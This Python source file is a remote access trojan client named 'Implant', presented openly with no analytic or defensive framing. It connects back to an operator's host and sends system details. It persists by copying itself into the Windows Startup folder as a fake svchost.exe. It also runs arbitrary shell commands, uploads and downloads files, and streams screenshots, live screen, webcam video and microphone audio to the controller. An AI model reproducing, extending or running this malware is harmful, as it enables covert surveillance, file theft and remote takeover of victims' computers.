import io,time
import socket
import os,sys,subprocess
import platform,shutil
import cv2
import json
import base64 
import mss
from PIL import Image
import zlib
import pyaudio

class Implant:
    def __init__(self,ip,port):

        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.socket.connect((ip,port))
        self.get_sysinfo()
        self.persistence()
        
    def get_sysinfo(self):

        sysinfo = {
            "type": "sysinfo",
            "sysinfo":platform.uname(),
            "user": os.getenv('USERNAME') or os.getenv('USER'),
            "cwd": os.getcwd(),
            "pid": os.getpid()
        }

        self.socket.send(json.dumps(sysinfo).encode())

    def persistence(self):

        cur_file = sys.executable
        file_loc = os.getenv("appdata") + r"\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
        
        if not os.path.exists(file_loc):
            shutil.copyfile(cur_file,file_loc)

    def execute_command(self,cmd):

        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            return result.decode()
        
        except subprocess.CalledProcessError as e:
            return e.output.decode()
    
    def write_file(self,filename,content):

        with open(filename,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Successfully download "

    def read_file(self,path):

        with open(path,"rb") as file:
            return base64.b64encode(file.read())
        
    def directory(self,path):

        try:
            os.chdir(path)
            return "\n"+os.getcwd()
        
        except OSError:
            return "\n"+os.getcwd()
        
    def send(self,data):

        json_data = json.dumps(data)
        header = len(json_data).to_bytes(4, byteorder='big')

        self.socket.send(header + json_data.encode('utf-8'))
    
    def receive(self):
        json_data = ""

        while True:

            try:
                json_data += self.socket.recv(4096).decode('utf-8')
                return json.loads(json_data)
            
            except json.JSONDecodeError:
                if not json_data:
                    break
                continue
    
    def upload(self,data):

        if not data:
            return "[-] No file or directory found"
        num = 0

        for file_path,content in data.items():
            folder = file_path.removesuffix(os.path.basename(file_path))
            if not os.path.exists(folder) and folder != "":
                os.makedirs(folder)
            result = self.write_file(file_path,content.encode())
            num += 1

        return f"{result} {num} files" 
    
    def download(self,path):

        folder_content = {}

        if os.path.isfile(path):
            folder_content[os.path.basename(path)] = self.read_file(path).decode()
        
        for root, dirs, files in os.walk(path):
            for file in files:
                file_path = os.path.join(root,file).replace("\\","/")
                folder_content[file_path] = self.read_file(file_path).decode()

        return folder_content
    
    def screen_image(self):

        sct = mss.mss()
        monitor = sct.monitors[1]

        raw_img = sct.grab(monitor)
        frame = Image.frombytes("RGB", raw_img.size, raw_img.bgra, "raw", "BGRX")
        jpeg_buffer = io.BytesIO()

        frame.save(jpeg_buffer, format='JPEG', quality=85, optimize=True)
        jpeg_bytes = jpeg_buffer.getvalue()
        compressed = zlib.compress(jpeg_bytes, level=6)
        
        del raw_img, frame, jpeg_buffer, jpeg_bytes

        return base64.b64encode(compressed).decode(),compressed
    
    def screenshot(self):
        
        img_b64, compressed = self.screen_image()
        data = {"type":"media","action":"screenshot","data":img_b64}

        self.send(data)

        del compressed, img_b64, data

    def _loop_screenshots(self,interval):
        while True:

            self.screenshot()
            self.socket.setblocking(0)
                        
            try:
                data = self.receive()

                if data and data.get("type") == "media" and data.get("action") == "stopshare":
                    self.socket.sendall((0).to_bytes(4, byteorder='big')) 
                    self.socket.setblocking(1)
                    del data
                    break

            except BlockingIOError:
                pass

            finally:
                time.sleep(interval)
                self.socket.setblocking(1)
                            

                
    def screenshare(self):

        while True:

            img_b64, compressed = self.screen_image()
            data = {"type":"media","action":"screenshare","data":img_b64}
            self.send(data)
            self.socket.setblocking(0)

            try:
                data = self.receive()
                
                if data and data.get("type") == "media" and data.get("action") == "stopshare":
                    self.socket.sendall((0).to_bytes(4, byteorder='big')) 
                    self.socket.setblocking(1)
                    break

            except BlockingIOError:
                pass

            finally:
                self.socket.setblocking(1)

                del compressed, img_b64, data

    def webcam(self):

        cap = cv2.VideoCapture(0)

        while True:

            ret, frame = cap.read()

            if not ret:
                break

            _, jpeg_data = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
            compressed = zlib.compress(jpeg_data.tobytes(), level=6)
            img_b64 = base64.b64encode(compressed).decode()

            data = {"type":"media","action":"webcam","data":img_b64}
            self.send(data)
            self.socket.setblocking(0)

            try:
                data = self.receive()

                if data and data.get("type") == "media" and data.get("action") == "stopshare":
                    cap.release()
                    self.socket.sendall((0).to_bytes(4, byteorder='big')) 
                    self.socket.setblocking(1)
                    break
                
            except BlockingIOError:
                pass

            finally:
                self.socket.setblocking(1)
                del frame,jpeg_data,compressed, img_b64, data

    def mic(self):

        p = pyaudio.PyAudio()
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100

        stream = p.open(format=FORMAT, channels=CHANNELS,
                rate=RATE, input=True,
                frames_per_buffer=CHUNK)
        
        while True:

            mic_data = stream.read(CHUNK)

            data = {"type":"media","action":"mic","data":mic_data.hex()}
            self.send(data)
            self.socket.setblocking(0)

            try:
                data = self.receive()

                if data and data.get("type") == "media" and data.get("action") == "stopshare":
                    stream.stop_stream()
                    stream.close()
                    p.terminate()
                    self.socket.sendall((0).to_bytes(4, byteorder='big')) 
                    self.socket.setblocking(1)
                    break

            except BlockingIOError:
                pass

            finally:
                self.socket.setblocking(1)
                del mic_data,data

    def cmd_process(self,cmd):

        if cmd["type"] == "exit":
            self.socket.close()
            sys.exit()

        if cmd["type"] == "shell":

            if cmd["cmd"].startswith("cd "):
                path = cmd["cmd"][3:].strip()
                output = self.directory(path)

            elif cmd["cmd"].startswith("upload"):
                output = self.upload(cmd["data"]) 

            elif cmd["cmd"].startswith("download"):
                file_path = cmd["cmd"].split(" ", 1)[1].strip()
                output = self.download(file_path)
            else:
                output = self.execute_command(cmd["cmd"])

            data = {"type":"shell","output":output}

            return data
        
        elif cmd["type"] == "media":

            if cmd["action"] == "screenshot":
                self.screenshot()
                if cmd["cmd"].startswith("record"):
                    cmds = cmd['cmd'].split()
                    interval = cmds[1] if len(cmds)>1 else ""
                    if interval.isdigit():
                        interval = int(interval)
                    else:
                        interval = 3
                    
                    self._loop_screenshots(interval)
                    
                
            elif cmd["action"] == "screenshare":
                self.screenshare()
                
            elif cmd["action"] == "webcam":
                self.webcam()
                
            elif cmd["action"].startswith("mic"):
                self.mic()
                
                
            return None
                

    def main(self):

        while True:
                cmd = self.receive()
                if cmd == "":
                    continue
                
                output = self.cmd_process(cmd)

                if output is None:
                    continue

                self.send(output)
